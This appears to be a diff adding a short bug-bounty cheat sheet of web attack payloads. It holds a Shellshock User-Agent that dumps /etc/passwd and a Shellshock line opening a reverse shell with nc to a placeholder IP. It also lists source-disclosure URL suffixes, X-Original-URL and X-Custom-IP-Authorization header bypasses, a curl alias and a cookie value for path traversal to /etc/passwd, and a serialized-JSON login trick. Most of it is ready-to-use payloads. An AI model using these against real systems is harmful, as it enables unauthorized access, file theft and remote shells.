@@ -1,0 +1,67 @@
+https://github.com/daffainfo/AllAboutBugBounty/blob/master/Bypass%20403.md
+
+User-Agent: () { :;}; echo $(</etc/passwd)
+() { :;}; /usr/bin/nc ip 1337 -e /bin/bash
+
+http://site.com/file.php
+response = nothing
+http://site.com/file.php~
+response = source
+
+http://site.com/file.php
+response = nothing
+http://site.com/file.php%2500.md
+response = source
+
+http://site.com/file.php
+response = nothing
+http://site.com/file.php%23.html
+response = source
+
+http://site.com/file.php
+response = nothing
+http://site.com/./file.php/.
+response = source
+
+GET /admin HTTP/1.1
+Host: http://site.com
+...
+Access is denied
+GET /test HTTP/1.1
+Host: http://site.com
+X-Original-URL: /admin
+HTTP/1.1 200 OK
+
+alias lfi="curl -H 'Accept: ../../../../../../../../../etc/passwd{{' "
+
+======================================================================
+How to find authentication bypass vulnerabilities.
+Focus. I Added headers.
+
+Request
+GET /delete?user=test HTTP/1.1
+Response
+HTTP/1.1 401 Unauthorized
+
+Reqeust
+GET /delete?user=test HTTP/1.1
+X-Custom-IP-Authorization: 127.0.0.1
+Response
+HTTP/1.1 302 Found
+
+======================================================================
+How to find local file read vuln based on cookies.
+
+Request
+GET /vulnerable.php HTTP/1.1
+Cookie:usid=../../../../../../../../../../../../../etc/pasdwd
+
+Response
+HTTP/1.1 200 OK 
+...
+Server Apache 2.4 
+
+======================================================================
+PHP POST Request
+https://t.co/kIUfsTSxMW?amp=1
+username=Admin&password=Admin --> add new serialized json one or more times {"username": "Admin", "password": "Admin"}
